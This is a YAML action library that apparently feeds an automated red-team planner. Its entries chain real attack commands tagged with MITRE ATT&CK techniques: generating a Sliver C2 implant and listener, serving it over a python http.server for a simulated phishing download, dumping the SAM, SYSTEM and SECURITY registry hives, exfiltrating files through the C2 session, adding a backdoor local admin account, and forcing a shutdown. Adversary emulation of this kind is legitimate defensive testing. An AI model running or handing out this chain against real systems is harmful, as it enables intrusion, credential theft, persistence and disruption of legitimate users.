attack_action_sequence:
  - uuid: sliver-payload-windows-exe
    name: Build the executable file of a Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        required: true
      LPORT:
        default:
        description: listening port of the attacter machine
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        required: true
        pddl_index: string0_var_in_plan
    preconditions:
      - (os-windows ?target - host)
    effects:
      - (sliver-implant-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?file - file)
      - (file-on-attacker ?path - string ?file - file)
      - (standalone-exe-file ?file - file)
      - (payload-handler-set ?p - payload)
      - (callback-covered ?file - file)
  - uuid: simulate-download-file
    name: Simulate the victim download a file on its machine
    id:
      - T1566.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Initial Access
    technique:
      - 'Phishing: Spearphishing Link'
    description: This step simulates the victim accidentally downloads a malicious
      file by clicking a link.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server #{LPORT}

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{SAVE_PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the http file server (typically the attacker machine)
        type:
        required: true
      LPORT:
        default: 8000
        description: port of the http file server
        type:
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - operator: or
        operands:
          - (os-linux ?target - host)
          - (os-windows ?target - host)
          - (os-macos ?target - host)
      - (file-on-attacker ?localpath - string ?file - file)
    effects:
      - (file-exists ?path - string ?file - file ?target - host)
  - uuid: simulate-execute-lnk-windows
    name: Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged
      executable
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description: |
      This step simulates the victim opening a `.lnk` shortcut file whose target is a pre-staged executable on the victim host. LNKs are a very common phishing vehicle — often delivered inside an archive with a misleading double-extension name (e.g. `invoice.pdf.lnk`). Double-clicking the shortcut runs the pointed-to executable via `explorer.exe`.
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, on the desktop or a folder)
        Double-click a shortcut (.lnk) file whose target is:
        #{EXE_PATH}
    arguments:
      EXE_PATH:
        default:
        description: Path of the executable the shortcut points at
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - (os-windows ?target - host)
      - (file-exists ?path - string ?file - file ?target - host)
      - (standalone-exe-file ?file - file)
      - (callback-covered ?file - file)
    effects:
      - (file-executed ?file - file ?target - host)
  - uuid: execute-sliver-payload-file
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: Sliver Session Establish
      command: |
        None
    arguments:
    preconditions:
      - (sliver-implant-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?f - file)
      - (file-executed ?f - file ?target - host)
      - (payload-handler-set ?p - payload)
    effects:
      - (sliver-session ?s - executor ?target - host)
      - operator: When
        params:
          condition: (file-executed-elevated ?f - file ?target - host)
          effect: (elevated-executor ?s - executor)
  - uuid: sliver-ps
    name: Remote Processes List
    id:
      - T1057
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - Process Discovery
    description: The `ps` command lists all running processes on a remote system.
      It returns a list of processes with details such as the process ID (PID) and
      executable name. The command includes flags for exe, overflowing terminal width,
      filtering based on owner/pid, printing command line arguments, skipping the
      first n page(s), printing process tree and setting outtime.
    execution:
      executor: Sliver Executor
      command: ps(session_id=#{executor})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor3_var_in_plan
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (process-info-known ?target - host)
  - uuid: simulate-download-execute-file-root
    name: Simulate the victim download and execute malicious payload file as Admin
      (Root)
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server #{LPORT}

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{SAVE_PATH} as Admin (Root)
    arguments:
      LHOST:
        default:
        description: IP address of the http file server (typically the attacker machine)
        type:
        required: true
      LPORT:
        default: 8000
        description: port of the http file server
        type:
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        required: true
        pddl_index: string1_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - operator: or
        operands:
          - (os-linux ?target - host)
          - (os-windows ?target - host)
          - (os-macos ?target - host)
      - (file-on-attacker ?localpath - string ?file - file)
      - operator: or
        operands:
          - (standalone-exe-file ?file - file)
          - (elf-file ?file - file)
      - (callback-covered ?file - file)
    effects:
      - (file-exists ?path - string ?file - file ?target - host)
      - (file-executed-elevated ?file - file ?target - host)
  - uuid: execute-sliver-payload-file
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: Sliver Session Establish
      command: |
        None
    arguments:
    preconditions:
      - (sliver-implant-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?f - file)
      - (file-executed ?f - file ?target - host)
      - (payload-handler-set ?p - payload)
    effects:
      - (sliver-session ?s - executor ?target - host)
      - operator: When
        params:
          condition: (file-executed-elevated ?f - file ?target - host)
          effect: (elevated-executor ?s - executor)
  - uuid: sliver-cmd
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Session Derive
      command: |
        # no-op — derivation only
    arguments:
      executor_parent:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor0_var_in_plan
      executor_derived:
        description: The derived Windows CMD executor.
        required: true
        pddl_index: executor1_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (command-prompt ?s2 - executor ?target - host)
      - operator: When
        params:
          condition: (elevated-executor ?executorID - executor)
          effect: (elevated-executor ?s2 - executor)
  - uuid: art-t1003_002-reg-save-sam
    name: Registry dump of SAM, creds, and secrets
    id:
      - T1003.002
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: Security Account Manager'
    description: |
      `reg save` writes the SAM, SYSTEM and SECURITY registry hives to a
      target-side directory (default `%TEMP%`). The hives hold encrypted /
      structured credential material — offline processing (impacket-
      secretsdump, creddump7, PowerDump, …) is a separate step and is NOT
      modelled by this action. A chain that wants to close the credential-
      access stage via this path must include downstream file exfil +
      offline-parse actions. ART auto_generated_guid
      5c2571d0-1572-416d-9676-812e64ca9f44.
    execution:
      executor: Command Prompt Executor
      command: |
        reg save HKLM\sam #{save_dir}\sam
        reg save HKLM\system #{save_dir}\system
        reg save HKLM\security #{save_dir}\security
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke reg save.
        required: true
        pddl_index: executor1_var_in_plan
      save_dir:
        default: '%TEMP%'
        description: Directory on the target where the SAM / SYSTEM / SECURITY hives
          are written.
        required: true
        pddl_index: string3_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-in-file ?d - data ?f - file)
      - (file-exists ?path - string ?f - file ?target - host)
      - (callback-covered ?f - file)
  - uuid: sliver-download
    name: File Download Operation
    id:
      - T1020
    source: Sliver
    supported_platforms:
      - windows
      - linux
    tactics:
      - Collection
    technique:
      - Data from Local System
    description: The `download` command transfers files from target system to local
      machine.
    execution:
      executor: Sliver Executor
      command: download(session_id=#{executor}, remote_path=#{remote_path}, recurse=#{recurse},
        output_dir=#{output_dir})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor3_var_in_plan
      remote_path:
        description: Full path to remote file/directory
        required: true
        pddl_index: string3_var_in_plan
      recurse:
        description: Recursive download (true/false)
        default: false
        required: true
      output_dir:
        description: Local directory to save files
        default: /tmp
        required: true
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
      - (file-exists ?remote_path - string ?file - file ?target - host)
    effects:
      - (file-on-attacker ?localpath - string ?file - file)
  - uuid: art-t1136_001-net-user-admin
    name: Create a new Windows admin user
    id:
      - T1136.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Create Account: Local Account'
    description: |
      Creates a new local account and adds it to the local `administrators`
      group in one shot. Strong persistence pattern — attacker gains a
      privileged backdoor account. ART auto_generated_guid
      fda74566-a604-4581-a4cc-fbbe21d66559.
    execution:
      executor: Command Prompt Executor
      command: |
        net user /add "#{username}" "#{password}"
        net localgroup administrators "#{username}" /add
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke net.
        required: true
        pddl_index: executor1_var_in_plan
      username:
        default: BackupAdmin
        description: Local admin account name to create.
        required: true
      password:
        default: ComplexPass!23
        description: Password for the new admin account.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (user-created ?u - user ?target - host)
  - uuid: art-t1529-shutdown
    name: Shutdown System - Windows
    id:
      - T1529
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - System Shutdown/Reboot
    description: |
      Issues `shutdown /s` to power down the target after a short countdown.
      Availability impact — legitimate users lose access until the host is
      restarted. ART auto_generated_guid ad254fa8-45c0-403b-8c77-e00b3d3e7a64.
    execution:
      executor: Command Prompt Executor
      command: |
        shutdown /s /t #{timeout}
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke shutdown.
        required: true
        pddl_index: executor1_var_in_plan
      timeout:
        default: 60
        description: Seconds until shutdown fires (giving the operator a window to
          abort during testing).
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (system-shutdown ?target - host)
